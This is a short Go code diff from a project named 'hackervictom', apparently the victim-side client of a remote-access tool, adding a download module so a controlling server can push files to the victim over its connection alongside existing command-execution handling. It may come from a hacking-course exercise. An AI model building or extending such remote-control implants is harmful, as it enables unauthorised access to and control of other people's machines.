@@ -1,6 +1,7 @@
 package main
 
 import (
+	"JayneJacobs/hackervictom/core/download"
 	"JayneJacobs/hackervictom/core/executecommandwin"
 	"JayneJacobs/hackervictom/core/handleconnection"
 	"JayneJacobs/hackervictom/core/move"
@@ -60,6 +61,7 @@ func main() {
 			DisplayError(err)
 		case "3":
 			fmt.Println("[+] Downloading file from Server ")
+			download.ReadFile(connection)
 		case "99":
 			fmt.Println("[+] Exiting windows")
 			loopControl = false
